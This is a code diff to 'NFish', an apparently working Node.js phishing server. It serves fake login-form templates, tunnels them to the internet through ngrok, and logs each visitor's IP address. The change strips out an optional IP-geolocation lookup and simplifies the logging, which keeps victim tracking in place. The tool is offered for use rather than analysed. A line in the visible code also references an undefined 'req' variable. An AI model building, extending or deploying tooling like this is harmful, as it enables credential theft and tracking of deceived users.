@@ -4,9 +4,6 @@ const fs = require('fs')
 const express = require('express');
 const bodyParser = require('body-parser');
 
-const iplocate = require('node-iplocate');
-const http = require('http');
-
 const connectToWorld = require('./ngrokHandler');
 
 const process = require('process')
@@ -19,8 +16,7 @@ const program = new Command();
 program.name("NFish@"+version)
 program.description(description)
 
-program.option('--no-tunnel', "Don't use default NGROK service for tunneling (Default false)")
-program.option('--no-iploc', "Don't Locate the IP Addr (uses iplocate.io api with 1000-Requests/day) (Default false)")
+program.option('--no-tunnel', "Don't use default NGROK service for tunneling (Default false).")
 program.option('-p, --port <int>', 'Port number, which server will use (Default 8080).')
 program.option('-t, --template <str>', 'Fake phishing form template to use (Default template/index.html).')
 program.option('-v, --version', 'Show Program Version.')
@@ -28,7 +24,6 @@ program.option('-v, --version', 'Show Program Version.')
 var args = program.parse(process.argv).opts()
 // Flip the value because it is by default true.
 args.tunnel = !args.tunnel
-// args.iploc = !args.iploc
 
 if (args.help) {
 	program.help();
@@ -93,21 +88,10 @@ app.get('/', function(request, response) {
 	const ip = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
 	console.log(ip + " Connected To Server.");
 
-	if (args.iploc) {
-		iplocate(ip).then((results) => {
-			addJSON(
-				path.resolve(path.join(__dirname, '../output/ipAddr.json')),
-				results
-			)		
-		});
-	} else {
-		addJSON(
-			path.resolve(path.join(__dirname, '../output/ipAddr.json')),
-			{
-				ip: ip
-			}
-		)		
-	}
+	addJSON(
+		path.resolve(path.join(__dirname, '../output/ipAddr.json')),
+		{ ip: ip }
+	);
 });
 
 app.post('/validate', function(request, response) {
@@ -126,17 +110,6 @@ app.post('/validate', function(request, response) {
 			}
 		)
 
-		if (args.iploc) {
-			iplocate(ip).then((results) => {
-				addJSON(
-					path.resolve(path.join(__dirname, '../output/ipAddr.json')),
-					{
-						ip: ip
-					}
-				)		
-			});
-		}
-	
 		response.redirect('/?valid=true')
 		response.end();
 	} else {
